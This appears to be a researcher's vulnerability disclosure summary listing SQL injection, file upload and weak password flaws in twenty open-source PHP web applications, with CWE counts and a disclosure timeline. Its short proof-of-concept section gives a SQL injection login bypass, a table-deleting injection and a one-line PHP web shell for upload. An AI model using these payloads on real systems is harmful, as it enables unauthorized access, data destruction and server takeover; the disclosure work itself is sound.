# Security Disclosures 2026

> Responsible vulnerability disclosures in open-source PHP web applications.  
> **Researcher:** [@abdurazzoqovjavohir700-dev](https://github.com/abdurazzoqovjavohir700-dev)  
> **Email:** abdurazzoqovjavohir700@gmail.com  
> **Disclosure Policy:** 90-day responsible disclosure (public after 2026-09-19)

---

## Summary

| # | CVE Candidate | Application | Vulnerability | CVSS | Status |
|---|---|---|---|---|---|
| 1 | Pending | [Hospital Management System](https://github.com/kishan0725/Hospital-Management-System) | SQL Injection + Plaintext Passwords | 9.8 Critical | [Issue #72](https://github.com/kishan0725/Hospital-Management-System/issues/72) |
| 2 | Pending | [Blood Bank](https://github.com/varunsardana004/Blood-Bank) | SQL Injection x3 | 9.8 Critical | [Issue #24](https://github.com/varunsardana004/Blood-Bank/issues/24) |
| 3 | Pending | [Hotel Management System](https://github.com/tushar-2223/Hotel-Management-System) | SQL Injection x5 (DELETE/EDIT) | 9.8 Critical | [Issue #18](https://github.com/tushar-2223/Hotel-Management-System/issues/18) |
| 4 | Pending | [Online Shopping System Advanced](https://github.com/PuneethReddyHC/online-shopping-system-advanced) | SQL Injection + MD5 Passwords | 9.8 Critical | [Issue #83](https://github.com/PuneethReddyHC/online-shopping-system-advanced/issues/83) |
| 5 | Pending | [Online Examination System](https://github.com/projectworldsofficial/online-examination-systen-in-php) | addslashes() Bypass + Auth Logic Flaw | 9.8 Critical | [Issue #10](https://github.com/projectworldsofficial/online-examination-systen-in-php/issues/10) |
| 6 | Pending | [Inventory Management System](https://github.com/PuneethReddyHC/inventory_management_system) | SQL Injection + Hardcoded Backdoor Credentials | 9.8 Critical | [Issue #1](https://github.com/PuneethReddyHC/inventory_management_system/issues/1) |
| 7 | Pending | [Online Shopping System](https://github.com/PuneethReddyHC/online-shopping-system) | SQL Injection x3 | 9.8 Critical | [Issue #38](https://github.com/PuneethReddyHC/online-shopping-system/issues/38) |
| 8 | Pending | [College Event Management System](https://github.com/BhavanaG7/College-Event-Management-System) | SQL Injection via multi_query() (5 tables) | 9.8 Critical | [Issue #10](https://github.com/BhavanaG7/College-Event-Management-System/issues/10) |
| 9 | Pending | [Online Voting System](https://github.com/itzzmerov/online-voting-system) | SQL Injection + Unrestricted File Upload + Open Redirect | 9.8 Critical | [Issue #3](https://github.com/itzzmerov/online-voting-system/issues/3) |
| 10 | Pending | [Job Portal](https://github.com/sabbirhosen44/Job-Portal) | SQL Injection in Job Search | 8.8 High | [Issue #9](https://github.com/sabbirhosen44/Job-Portal/issues/9) |
| 11 | Pending | [Online Book Store](https://github.com/projectworldsofficial/online-book-store) | SQL Injection + Auth Logic Flaw (AND/OR) + SHA1 | 9.8 Critical | [Issue #22](https://github.com/projectworldsofficial/online-book-store/issues/22) |
| 12 | Pending | [Lost And Found](https://github.com/AvinashAnand02/Lost-And-Found) | SQL Injection in Category Management | 8.8 High | [Issue #7](https://github.com/AvinashAnand02/Lost-And-Found/issues/7) |
| 13 | Pending | [Online Pizza Delivery](https://github.com/darshankparmar/OnlinePizzaDelivery) | SQL Injection + Reflected XSS | 9.8 Critical | [Issue #5](https://github.com/darshankparmar/OnlinePizzaDelivery/issues/5) |
| 14 | Pending | [Blood Bank Management DBMS](https://github.com/sarin32/Blood-Bank-Management-System-DBMS) | SQL Injection x3 + Plaintext Password Storage | 9.8 Critical | [Issue #7](https://github.com/sarin32/Blood-Bank-Management-System-DBMS/issues/7) |
| 15 | Pending | [Online Clinic Management System](https://github.com/subhajitkhan/online-clinic-management-system) | SQL Injection in Admin + Patient Login | 9.8 Critical | [Issue #1](https://github.com/subhajitkhan/online-clinic-management-system/issues/1) |
| 16 | Pending | [Hospital Management System](https://github.com/blackburn3333/Hospital-Management-System) | SQL Injection in DELETE Operations x2 | 9.8 Critical | [Issue #1](https://github.com/blackburn3333/Hospital-Management-System/issues/1) |
| 17 | Pending | [Student Management System](https://github.com/ningzichun/student-management-system) | SQL Injection x3 + Weak MD5 Hashing | 9.8 Critical | [Issue #8](https://github.com/ningzichun/student-management-system/issues/8) |
| 18 | Pending | [Online Appointment Management](https://github.com/likhitaavl2k/Online-Appointment-Management-System) | SQL Injection via Variable Escape Bug | 9.8 Critical | [Issue #2](https://github.com/likhitaavl2k/Online-Appointment-Management-System/issues/2) |
| 19 | Pending | [Student Management System](https://github.com/diveshlunker/Management-system-students) | SQL Injection + Unrestricted File Upload (RCE) | 9.8 Critical | [Issue #8](https://github.com/diveshlunker/Management-system-students/issues/8) |
| 20 | Pending | [Pharmacy Management System](https://github.com/Varshini-E/Pharmacy-Management-System) | SQL Injection in 5 DELETE Endpoints | 9.8 Critical | [Issue #6](https://github.com/Varshini-E/Pharmacy-Management-System/issues/6) |

---

## Vulnerability Classes

| CWE | Description | Count |
|-----|-------------|-------|
| CWE-89 | SQL Injection | 18 |
| CWE-434 | Unrestricted File Upload (RCE) | 2 |
| CWE-916 | Use of Password Hash With Insufficient Computational Effort (MD5/SHA1) | 4 |
| CWE-256 | Plaintext Password Storage | 3 |
| CWE-798 | Hardcoded Credentials | 1 |
| CWE-601 | Open Redirect | 1 |
| CWE-287 | Improper Authentication (Logic Flaw) | 2 |
| CWE-79 | Cross-Site Scripting (XSS) | 1 |

---

## Proof of Concept

### SQLi Authentication Bypass (generic PoC for all login forms)
```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'OR'1'='1'--+-&password=anything
```

### SQLi in DELETE endpoints (generic PoC)
```http
GET /delete.php?id=1'OR'1'='1 HTTP/1.1
```
Result: All records deleted from the target table.

### Unrestricted File Upload → Remote Code Execution
```
1. Upload file named "shell.php" with content: <?php system($_GET['cmd']); ?>
2. Access: /uploads/shell.php?cmd=id
3. Result: Command execution on server
```

---

## CVE Request Status

CVE requests submitted to:
- [x] MITRE (cve-assign@mitre.org) — Pending response
- [x] GitHub Security Advisories — Requested from maintainers
- [ ] CVE numbers pending assignment

---

## Disclosure Timeline

- **2026-06-19** — Vulnerabilities discovered via static code analysis
- **2026-06-19** — GitHub issues opened (responsible disclosure)
- **2026-06-19** — CVE assignment requested from MITRE and GitHub CNA
- **2026-09-19** — Full public disclosure (90-day window)

---

## Contact

For questions about these disclosures:  
**GitHub:** [@abdurazzoqovjavohir700-dev](https://github.com/abdurazzoqovjavohir700-dev)  
**Email:** abdurazzoqovjavohir700@gmail.com

*All vulnerabilities reported following OWASP responsible disclosure guidelines.*
